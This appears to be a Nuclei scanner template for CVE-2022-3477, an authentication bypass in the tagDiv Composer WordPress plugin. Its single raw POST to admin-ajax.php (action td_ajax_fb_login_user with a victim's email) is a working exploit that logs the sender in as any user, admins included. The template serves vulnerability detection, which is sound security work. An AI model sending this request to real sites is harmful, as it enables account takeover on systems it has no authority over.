id: CVE-2022-3477

info:
  name: WordPress tagDiv Composer < 3.5 - Authentication Bypass
  author: melmathari
  severity: critical
  description: |
    The tagDiv Composer WordPress plugin before 3.5, required by the Newspaper WordPress theme before 12.1 and Newsmag WordPress theme before 5.2.2, does not properly implement the Facebook login feature, allowing unauthenticated attackers to login as any user by just knowing their email address
  impact: |
    Unauthenticated attackers who know a user's email address can bypass authentication through the Facebook login feature to gain complete access to any user account including administrator accounts on WordPress sites using tagDiv Composer.
  remediation: Fixed in 3.5
  reference:
    - https://wpscan.com/vulnerability/993a95d2-6fce-48de-ae17-06ce2db829ef
    - https://nvd.nist.gov/vuln/detail/CVE-2022-3477
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-3477
    cwe-id: CWE-287
    epss-score: 0.55323
    epss-percentile: 0.97992
    cpe: cpe:2.3:a:newsmag_project:newsmag:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: newsmag_project
    product: newsmag
    framework: wordpress
  tags: cve,cve2022,wordpress,wp-plugin,wpscan,wp,auth-bypass,tagdiv,vkev,vuln

variables:
  email: "{{email}}"  # victim's email address required.

http:
  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=td_ajax_fb_login_user&user[email]={{email}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"success":"You have been successfully logged in!'

      - type: word
        part: content_type
        words:
          - 'text/html'

      - type: status
        status:
          - 200
# digest: 4a0a0047304502200d870d34f95ede7bb69a123d9b5ded9d9c4cd48e63a95ae6aa8b4ae9ec260cdc022100f464c2a7d7adfada4d1003f152b60ea3af106626b04e9b8576a9c4b4429e21e1:922c64590222798bb761d5b6d8e72950